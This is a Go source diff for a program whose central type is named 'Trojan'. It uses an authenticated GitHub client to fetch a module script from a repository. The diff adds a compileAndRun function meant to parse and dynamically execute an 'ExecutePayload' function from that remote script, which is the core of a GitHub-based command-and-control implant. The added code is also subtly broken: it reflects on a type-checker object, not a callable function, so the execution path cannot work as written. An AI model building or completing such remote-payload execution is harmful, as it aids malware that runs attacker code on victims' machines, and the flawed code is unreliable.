@@ -2,12 +2,20 @@ package main
 
 import (
 	"context"
+	"go/ast"
+	"go/parser"
+	"go/token"
+	"go/types"
+	"reflect"
+
 	// "encoding/base64"
 	"encoding/json"
 	"fmt"
+
 	// "io"
 	"log"
 	"math/rand"
+
 	// "net/http"
 	"os"
 	"sync"
@@ -18,6 +26,7 @@ import (
 	"github.com/google/go-github/v69/github"
 
 	"golang.org/x/oauth2"
+	"golang.org/x/tools/go/packages"
 )
 
 type Trojan struct {
@@ -85,6 +94,54 @@ func (t *Trojan) get_config() ([]map[string]interface{}, error) {
 // 	}
 // }
 
+// Dynamically compile, execute Go code, and capture output
+func compileAndRun(sourceCode string) (string, error) {
+	// Parse the source code into an AST
+	fset := token.NewFileSet()
+	node, err := parser.ParseFile(fset, "", sourceCode, parser.AllErrors)
+	if err != nil {
+		return "", fmt.Errorf("failed to parse source code: %v", err)
+	}
+
+	// Type check the AST
+	conf := types.Config{Importer: nil}
+	info := &types.Info{
+		Types: make(map[ast.Expr]types.TypeAndValue),
+	}
+	_, err = conf.Check("cmd", fset, []*ast.File{node}, info)
+	if err != nil {
+		return "", fmt.Errorf("type checking failed: %v", err)
+	}
+
+	// Use go/packages to load the dynamically compiled package
+	pkgs, err := packages.Load(&packages.Config{Mode: packages.LoadSyntax}, "cmd")
+	if err != nil {
+		return "", fmt.Errorf("failed to load package: %v", err)
+	}
+
+	// Use reflection to find and execute the "ExecutePayload" function
+	for _, pkg := range pkgs {
+		obj := pkg.Types.Scope().Lookup("ExecutePayload")
+		if obj == nil {
+			return "", fmt.Errorf("ExecutePayload function not found")
+		}
+
+		fn := reflect.ValueOf(obj)
+		if fn.Kind() != reflect.Func {
+			return "", fmt.Errorf("ExecutePayload is not a function")
+		}
+
+		// Invoke the function dynamically and capture the result
+		results := fn.Call(nil)
+		if len(results) > 0 {
+			output := results[0].Interface().(string)
+			return output, nil
+		}
+	}
+
+	return "", fmt.Errorf("function executed but returned no output")
+}
+
 func (t *Trojan) module_runner(module string) {
 	script, err := get_file_contents("modules", "environment.go", t.client, t.ctx)
 	if err != nil {
@@ -92,7 +149,13 @@ func (t *Trojan) module_runner(module string) {
 	}
 
 	fmt.Println("[*] Script ---------------------", module)
-	fmt.Println(script)
+	result, err := compileAndRun(script)
+	if err != nil {
+		fmt.Println("Error executing script:", err)
+		return
+	}
+	fmt.Println("[*] Result ---------------------\n", result)
+
 }
 
 // func (t *Trojan) store_module_result(data interface{}) {
